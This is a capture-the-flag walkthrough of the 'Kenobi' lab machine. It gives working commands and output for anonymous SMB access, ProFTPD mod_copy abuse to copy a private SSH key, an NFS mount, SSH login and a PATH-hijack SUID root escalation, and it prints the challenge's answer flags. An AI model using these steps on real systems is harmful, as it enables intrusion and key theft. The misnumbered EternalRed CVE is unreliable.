# **Kenobi**

### Summary

This machine will cover a Samba share, manipulating version of proftdpd to gain initial access and escalate your privileges to root via an SUID binary.


#### Initial questions about machine.

* What exactly is a Samba share?
* How has it been attacked in real life?
* What is proftpd?

#### Samba Share

Samba is kinda like the interpreter between linux and unix based machines. Samba allows for linux and unix machines to talk to windows machines. SMB is only developed for Windows.

* Samba is based on the client/server protocol of SMB (Server Message Block)
* It allows end user to access and use files, printers and other commonly shared resources on a companies intranet or internet. its often referred to as a network file system.

The Server Message Block(SMB) is a network protocol that enables users to communicate with remote computers and servers; to use their resources or share, open. and edit files.

* It's also referred to as the server/client protocol, as the server has a resource that it can share with the client.

#### EternalRed 

* Much like the EternalBlue exploit, Samba was discovered to have a remote code execution vulnerability as well. 
* This vulnerability dates back to 2010.
* This affected all versions of Samba from 3.5.0 onwards.

This flaw is due to Samba loading shared modules from any path in the system leading to Remote Code Execution.

A hacker could use Samba's arbitrary module loading vulnerability to upload a shared library to a writable share and then cause the server to load and execute malicious code. This vulnerability is considerably easy since this can be done with one line of code, As long as the following conditions are met.

* make file- and printer-sharing port 445 reachable on the internet.
* configure shared files to have write privileges.
* use known or guessable server paths for those files

Since Samba is the SMB protocol implemented on Linux and UNIX systems it is known as the linux version of eternalblue.

This is the one line of code `simple.create_pipe("/path/to/target.so")`

This has a CVE attached to its name. **CVE-2014-7494**

#### Proftpd

ProFtpd is a free and open-source FTP server, compatible with Unix and Windows systems. Its also been vulnerable in the past software versions.

According to the website, ProFTpd grew out of the desire to have a secure and configurable FTP server, and out of a significant admiration of the apache web server.

Proftpd has had a history of security vulnerablities. With a total of 22 CVEs attached to its name.

* This includes 4 high rating CVEs.

With the most recent one happening in 2020, **CVE-2020-9273**:

* In ProFTPD 1.3.7, it is possible to corrupt the memory pool by interrupting the data transfer channel. This triggers a use-after-free in alloc_pool in pool.c, and possible remote code execution.

This compromises the whole CIA triad.

* This compromises **Confidentiality** because there is total information disclosure, resulting in all system files being revealed.
* There is a total compromise of system **Integrity**. There is a complete loss of system protection, resulting in the entire system being compromised.
* This compromises **Availability** because there is a total shutdown of the affected resource. The hacker can render the resource completely unavailable.


#### Task 1: Deploy the vulnerable machine

**Q1: Deploy the machine**

*No answer needed*

**Q2: Scan the machine with nmap, how many ports are open?**

Run scan with nmap on target machine: `sudo nmap -sS -sV -sC -T4 -oN nmap/initial_scan <target_ip>`

```
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      40231/tcp6  mountd
|   100005  1,2,3      44513/tcp   mountd
|   100005  1,2,3      48890/udp   mountd
|   100005  1,2,3      58864/udp6  mountd
|   100021  1,3,4      34902/udp   nlockmgr
|   100021  1,3,4      37157/tcp   nlockmgr
|   100021  1,3,4      45813/tcp6  nlockmgr
|   100021  1,3,4      46382/udp6  nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp open  nfs_acl     2-3 (RPC #100227)
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

From this scan we are able to identify **7 Ports** are open.
* we can also see that there is a FTP server up and running with version ProFTPD 1.3.5
* we can also see that a web server is running on port 80 with version Apache httpd 2.4.18 ((Ubuntu))
* we can also identify that Samba is running on ports 139 and 445.

#### Task 2: Enumerating Samba for shares

**Q1: How many shares have been found?**

In order to find the amount of shares we are going to use nmap. Nmap has amazing abilities when it comes to automating networking tasks. 

we will use scripts to enumerate the shares.

use this nmap scan: `nmap -p445 --script=smb-enum-shares.nse,smb-enum-users.nse <target_ip>`

```
Nmap scan report for 10.10.249.117
Host is up (0.12s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.249.117\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.249.117\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.249.117\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>

Nmap done: 1 IP address (1 host up) scanned in 18.68 seconds
```

From the scan from above we can see that there are 3 shares.*

**Q2:What is the file that can be seen?**

from the scan above we can see that there is a share named anonymous. using `smbclient` we can attempt to connect to the network share.

type the command: `smbclient //<ip>/anonymous`

When you are prompted to input a password you can just press 'enter' and bypass the authentication process.

```
> smbclient //10.10.190.38/anonymous 
Enter WORKGROUP\netrunner's password: 
Try "help" to get a list of possible commands.
smb: \> 
```

using the `ls` command, we can find the file that can be seen is *log.txt*

**Q3: What port is FTP running on?**

In order to read the file found on the share, We can use the `smbget` command.
* smbget is a simple utility with wget-like semantics, that can download files from SMB servers. You can specify the files you would like to download on the command-line.
* smbget is also apart of the Samba suite. which is running on this smb share on the machine 'Kenobi'

use this command: `smbget -R smb://<ip>/anonymous`
*once again press enter for both username and password.*

```
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kenobi/.ssh/id_rsa): 
Created directory '/home/kenobi/.ssh'.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kenobi/.ssh/id_rsa.
Your public key has been saved in /home/kenobi/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:C17GWSl/v7KlUZrOwWxSyk+F7gYhVzsbfqkCIkr2d7Q kenobi@kenobi
The key's randomart image is:
+---[RSA 2048]----+
|                 |
|           ..    |
|        . o. .   |
|       ..=o +.   |
|      . So.o++o. |
|  o ...+oo.Bo*o  |
| o o ..o.o+.@oo  |
|  . . . E .O+= . |
|     . .   oBo.  |
+----[SHA256]-----+

# This is a basic ProFTPD configuration file (rename it to 
# 'proftpd.conf' for actual use.  It establishes a single server
# and a single anonymous login.  It assumes that you have a user/group
# "nobody" and "ftp" for normal operation and anon.

ServerName			"ProFTPD Default Installation"
ServerType			standalone
DefaultServer			on

# Port 21 is the standard FTP port.
Port				21

```

When looking in this file we can find some interesting information. When looking at the start of the text file you can see that **there is information about generating an ssh key.** 
* the private key has been saved in: `/home/kenobi/.ssh/id_rsa`
* the public key has been saved in: `/home/kenobi/.ssh/id_rsa.pub`
After identifying that generation of a ssh key, we can see that this file is also **a basic ProFTPD configuration file** this allows us to find information about the ProFTPD server.

The port that FTP is running on is *21.*

**Q4: What mount can we see?**

In this machine's case, port 111 is access to a network file system.

`111/tcp  open  rpcbind     2-4 (RPC #100000)`

We can enumerate this with nmap.

use the command: `nmap -p111 --script=nfs-ls,nfs-statfs,nfs-showmount <ip>`

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-07 18:50 EDT
Nmap scan report for 10.10.190.38
Host is up (0.12s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /var *

Nmap done: 1 IP address (1 host up) scanned in 1.37 seconds
```
As shown from above the mount that can be seen is */var*.

#### Task 3: Gain initial access with ProFtpd

**Q1: What is the version?**

To find the version we can look at the initial nmap scan located in nmap/initial_scan. Or we can connect to the FTP server using netcat.

use command: `nc <target_ip> 21`

```
nc 10.10.190.38 21                                                           
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.190.38]

```
The version is *1.3.5*.

**Q2: How many exploits are there for the ProFTPD running?**

In order to find some exploits for this particular software we can use searchsploit.
* searchsploit is just the command line search tool for exploit-db.com.

use the command: `searchsploit proftpd 1.3.5`

```
searchsploit proftpd 1.3.5
---------------------------------------------------------------- ---------------------------------
 Exploit Title                                                  |  Path
---------------------------------------------------------------- ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)       | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution             | linux/remote/36803.py
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)         | linux/remote/49908.py
ProFTPd 1.3.5 - File Copy                                       | linux/remote/36742.txt
---------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

From this search result, we can see there are *4 exploits*.

**Q3**
*No answer needed.*

From the search results above we can see that there is an exploit from ProFTPD's mod_copy.
* The mod_copy module implements SITE CPFR and SITE CPTO commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination.

**Q4**

Using this vulnerablitiy we can move the private key for Kenobi to the /var directory since from enumerating the file system we were able to see that the /var directory was the mount we could see.

```
> nc 10.10.190.38 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.190.38]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
```

After connecting to the machine using netcat, use the command `SITE CPFR /home/kenobi/.ssh/id_rsa` in order to established the file in which we would like to copy which is the private key for Kenobi.

Then enter the command `SITE CPTO /var/tmp/id_rsa` in order to tell the file where it is being copied too.

*no answer needed*

**Q5: What is Kenobi's user flag?**

Now in order to grab the private key and sign in to Kenobi's machine we need to mount the directory to our machine and copy the private key on to our machine.

use the following commands: 
`sudo mkdir /mnt/kenobiNFS`
`sudo mount target_ip:/var /mnt/kenobiNFS`

We now have the directory mounted to our machine, to copy the private key to your machine use the command `cp /mnt/kenobiNFS/tmp/id_rsa .`

To connect to Kenobi's machine use the following commands:
`sudo chmod 600 id_rsa`
`ssh -i id_rsa kenobi@target_ip`

```
ssh -i id_rsa kenobi@10.10.190.38
The authenticity of host '10.10.190.38 (10.10.190.38)' can't be established.
ECDSA key fingerprint is SHA256:uUzATQRA9mwUNjGY6h0B/wjpaZXJasCPBY30BvtMsPI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.190.38' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

103 packages can be updated.
65 updates are security updates.


Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

kenobi@kenobi:~$ 

```

We now have access to kenobi's machine

the flag is *d0b0f3f53b6caa532a83915e19224899*

#### Task 4: Privilege Escalation with Path Variable Manipulation

**Q1: What file looks particulary out of the ordinary?**

SUID bits can be dangerous and custom files that have the SUID bit can lead to all sorts of issues.

To search the system for these types of files we can run the command:
`find / -perm -u=s -type f 2>/dev/null`

the answer is */usr/bin/menu*

**Q2: How many options appear?**

if we run the `menu` command on the kenobi machine is presents us with this:
```
kenobi@kenobi:~$ menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :

```

The answer is *3*.

**Q2**

Since this 'menu' command runs as the root users privileges, we can manipulate our path an gain a root shell.

```
kenobi@kenobi:/tmp$ echo /bin/sh > curl
kenobi@kenobi:/tmp$ ls
curl  systemd-private-72a4e6701c0c4a7e9649324ee26d0ec3-systemd-timesyncd.service-lKQrnx
kenobi@kenobi:/tmp$ chmod 777 curl
kenobi@kenobi:/tmp$ ls
curl  systemd-private-72a4e6701c0c4a7e9649324ee26d0ec3-systemd-timesyncd.service-lKQrnx
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
kenobi@kenobi:/tmp$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
# id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)

```

*No Answer needed*

**Q3: What is the root flag?**

```
# cd /
# ls
bin   etc	  initrd.img.old  lost+found  opt   run   srv  usr	vmlinuz.old
boot  home	  lib		  media       proc  sbin  sys  var
dev   initrd.img  lib64		  mnt	      root  snap  tmp  vmlinuz
# cd root
# ls
root.txt
# cat root.txt
177b3cd8562289f37382721c28381f02
# 
```

the root flag is *177b3cd8562289f37382721c28381f02*.

---